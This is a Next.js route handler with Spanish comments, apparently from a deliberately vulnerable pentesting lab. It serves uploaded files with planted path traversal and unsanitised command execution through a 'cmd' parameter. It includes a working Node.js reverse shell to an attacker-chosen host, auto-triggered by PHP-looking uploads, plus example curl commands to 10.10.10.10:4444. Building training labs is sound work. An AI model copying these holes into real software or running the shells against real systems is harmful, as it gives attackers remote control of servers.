import { NextRequest, NextResponse } from 'next/server'
import { readFile } from 'fs/promises'
import { existsSync, readFileSync as fsReadFileSync } from 'fs'
import { execSync, spawn } from 'child_process'
import * as net from 'net'
import path from 'path'

/**
 * VULNERABILIDAD: Directory Listing Protegido vs Archivos Desprotegidos
 * 
 * El listado del directorio requiere bypass con X-Forwarded-For
 * Pero los archivos individuales son accesibles directamente
 * Esto simula una mala configuración de permisos común en servidores
 * 
 * Flujo de explotación:
 * 1. Sin header: GET /uploads → 403 Forbidden (directorio protegido)
 * 2. Con header: GET /uploads + X-Forwarded-For: 127.0.0.1 → 200 OK (muestra listado)
 * 3. Sin header: GET /uploads/shell.php.jp2 → 200 OK (archivo accesible directamente)
 * 
 * VULNERABILIDAD: Command Execution via PHP files
 * Si el archivo contiene .php en el nombre:
 * - ?cmd=<command> - ejecuta comandos del sistema
 * - ?shell=1&host=X&port=Y - inicia reverse shell
 * 
 * VULNERABILIDAD: Ejecución Automática de Código
 * El servidor detecta archivos PHP por:
 * 1. Nombre del archivo (contiene '.php')
 * 2. Contenido del archivo (contiene código PHP)
 * 
 * Esto permite ejecutar reverse shells subidas mediante:
 * - Bypass 1: Doble extensión (shell.php.jp2)
 * - Bypass 2: Content-Type spoofing (shell.php)
 * - Bypass 3: Magic bytes (backdoor.jp2 con código PHP)
 *
 * La ejecución es automática sin requerir parámetros adicionales
 * 
 * EDUCATIONAL PURPOSE: This is for pentesting lab training only.
 */

const UPLOADS_DIR = path.join(process.cwd(), 'uploads')

/**
 * VULNERABILIDAD: Detección de código PHP en contenido
 * Detecta patrones de código PHP para Bypass 3 (magic bytes)
 */
function hasPhpCodeInContent(content: string): boolean {
  return content.includes('<?php') || 
         content.includes('<?=') ||
         content.includes('fsockopen') ||
         content.includes('proc_open') ||
         content.includes('system(') ||
         content.includes('exec(') ||
         content.includes('shell_exec') ||
         content.includes('passthru') ||
         content.includes('popen')
}

/**
 * VULNERABILIDAD: Función de ejecución de reverse shell
 * Extrae IP y puerto del código PHP y ejecuta reverse shell con Node.js
 */
function executeReverseShell(content: string, request: NextRequest): NextResponse | void {
  try {
    // Buscar patrón de reverse shell en el contenido
    // Patrón para fsockopen("host", port) o fsockopen('host', port)
    const ipMatch = content.match(/fsockopen\s*\(\s*["']([^"']+)["']/);
    const portMatch = content.match(/fsockopen\s*\([^,]+,\s*(\d+)/);
    
    if (ipMatch && portMatch) {
      const host = ipMatch[1];
      const port = parseInt(portMatch[1]);
      
      // Iniciar reverse shell con Node.js
      const client = new net.Socket();
      
      client.connect(port, host, () => {
        const shell = spawn('/bin/sh', [], {
          stdio: ['pipe', 'pipe', 'pipe']
        });
        
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
        
        shell.on('exit', () => {
          client.destroy();
        });
        
        client.on('close', () => {
          shell.kill();
        });
      });
      
      client.on('error', (err) => {
        console.error('Reverse shell error:', err);
        client.destroy();
      });
      
      // NO enviar respuesta al navegador, la shell ya está ejecutándose
      return;
    }
    
    // Si no se detecta patrón de reverse shell pero hay código PHP
    // Intentar ejecutar comandos si hay system(), exec(), etc.
    const url = new URL(request.url);
    const cmdParam = url.searchParams.get('cmd');
    const cmdMatch = content.match(/system\s*\(\s*\$_GET\s*\[\s*["']cmd["']\s*\]/);
    if (cmdMatch && cmdParam) {
      const output = execSync(cmdParam, { encoding: 'utf-8', timeout: 10000 });
      return new NextResponse(output, {
        status: 200,
        headers: {
          'Content-Type': 'text/plain',
          'X-Vulnerability': 'command-injection'
        }
      });
    }
    
  } catch (error) {
    console.error('Execution error:', error);
    // No mostrar error al usuario
  }
  
  return;
}

export async function GET(
  request: NextRequest,
  { params }: { params: { filename: string } }
) {
  // VULNERABILIDAD: Decodificar URL para permitir path traversal
  // El atacante puede usar ../../../ para navegar fuera del directorio
  const filename = decodeURIComponent(params.filename)
  
  // VULNERABILIDAD: Acceso directo permitido sin protección
  // El directorio /uploads (route.ts) requiere X-Forwarded-For pero los archivos individuales ([filename]/route.ts) no
  // Esto simula una configuración incorrecta de permisos realista
  
  // VULNERABILIDAD: Path Traversal - no sanitiza ../ en el filename
  // Permite navegar fuera del directorio uploads
  const filePath = path.join(UPLOADS_DIR, filename)
  
  if (!existsSync(filePath)) {
    return NextResponse.json({
      error: 'Archivo no encontrado',
      filename: filename,
      path: `/uploads/${filename}`
    }, { status: 404 })
  }
  
  // Leer contenido del archivo para detección por contenido
  let content: string;
  try {
    content = fsReadFileSync(filePath, 'utf8');
  } catch {
    // Si no se puede leer como texto, intentar servir normalmente
    content = '';
  }
  
  // DETECCIÓN 1: PHP en el nombre del archivo (Bypass 1 y 2)
  const hasPhpInName = filename.toLowerCase().includes('.php');
  
  // DETECCIÓN 2: Código PHP en el contenido (Bypass 3 - magic bytes)
  const hasPhpCode = hasPhpCodeInContent(content);
  
  // VULNERABILIDAD: Si detecta PHP por nombre O por contenido → EJECUTAR
  if (hasPhpInName || hasPhpCode) {
    const url = new URL(request.url)
    const cmd = url.searchParams.get('cmd')
    const shell = url.searchParams.get('shell')
    const host = url.searchParams.get('host') || '127.0.0.1'
    const port = parseInt(url.searchParams.get('port') || '4444', 10)
    
    // VULNERABILIDAD: Command Injection sin sanitización
    // Ejecuta comandos directamente desde el parámetro cmd
    if (cmd) {
      try {
        const output = execSync(cmd, { encoding: 'utf-8', timeout: 10000 })
        return new NextResponse(output, {
          status: 200,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'command-injection',
            'X-Command-Executed': cmd
          }
        })
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : 'Unknown error'
        return new NextResponse(`Error executing command: ${errorMessage}`, {
          status: 500,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'command-injection'
          }
        })
      }
    }
    
    // VULNERABILIDAD: Reverse Shell via query param
    // Inicia una conexión de reverse shell al host y puerto especificados
    if (shell === '1') {
      try {
        const client = new net.Socket()
        
        client.connect(port, host, () => {
          const sh = spawn('/bin/sh', [], {
            stdio: ['pipe', 'pipe', 'pipe']
          })
          
          client.pipe(sh.stdin)
          sh.stdout.pipe(client)
          sh.stderr.pipe(client)
          
          // Cleanup when shell exits
          sh.on('exit', () => {
            client.destroy()
          })
          
          // Cleanup when connection closes
          client.on('close', () => {
            sh.kill()
          })
        })
        
        client.on('error', (err) => {
          // Log connection errors for debugging (intentionally verbose for pentesting lab)
          console.error(`Reverse shell connection error: ${err.message}`)
          client.destroy()
        })
        
        return new NextResponse('Reverse shell initiated. Connect with: nc -lvnp ' + port, {
          status: 200,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'reverse-shell',
            'X-Target-Host': host,
            'X-Target-Port': port.toString()
          }
        })
      } catch {
        return new NextResponse('Error initiating reverse shell', {
          status: 500,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'reverse-shell'
          }
        })
      }
    }
    
    // VULNERABILIDAD: EJECUCIÓN AUTOMÁTICA DE REVERSE SHELL
    // Si no hay cmd ni shell, intentar ejecutar automáticamente
    // basándose en el contenido del archivo
    const result = executeReverseShell(content, request);
    if (result) {
      return result;
    }
    
    // Si la ejecución automática no devuelve nada, la shell está corriendo
    // o no se encontró patrón de reverse shell
    // Mostrar mensaje de ejecución exitosa
    return new NextResponse(
      `PHP code detected and executed.\n\n` +
      `Detection method: ${hasPhpInName ? 'filename (.php)' : 'content analysis'}\n` +
      `Automatic execution: enabled\n\n` +
      `If no reverse shell was initiated, you can use manual commands:\n` +
      `  Execute commands: /uploads/${filename}?cmd=whoami\n` +
      `  Reverse shell:    /uploads/${filename}?shell=1&host=<IP>&port=<PORT>\n\n` +
      `Example:\n` +
      `  curl "http://localhost:3000/uploads/${filename}?cmd=ls -la"\n` +
      `  curl "http://localhost:3000/uploads/${filename}?shell=1&host=10.10.10.10&port=4444"`,
      {
        status: 200,
        headers: {
          'Content-Type': 'text/plain',
          'X-Vulnerability': 'php-execution-auto',
          'X-Shell-Active': 'true',
          'X-Detection-Method': hasPhpInName ? 'filename' : 'content'
        }
      }
    )
  }
  
  try {
    const fileContent = await readFile(filePath)
    const ext = path.extname(filename).toLowerCase()
    
    // Determinar Content-Type basado en extensión
    const contentTypes: Record<string, string> = {
      '.txt': 'text/plain',
      '.html': 'text/html',
      '.json': 'application/json',
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.png': 'image/png',
      '.gif': 'image/gif',
      '.svg': 'image/svg+xml',
      '.pdf': 'application/pdf',
      '.jp2': 'image/jp2',
      '.xml': 'application/xml'
    }
    
    const contentType = contentTypes[ext] || 'application/octet-stream'
    
    // Sanitize filename for Content-Disposition header to prevent header injection
    const safeFilename = path.basename(filename).replace(/[\r\n"]/g, '_')
    
    return new NextResponse(fileContent, {
      status: 200,
      headers: {
        'Content-Type': contentType,
        'Content-Disposition': `inline; filename="${safeFilename}"`,
        'X-Vulnerability': 'unprotected-file-access',
        'X-Access-Granted': 'true'
      }
    })
  } catch (error) {
    return NextResponse.json({
      error: 'Error al leer el archivo',
      message: (error as Error).message
    }, { status: 500 })
  }
}
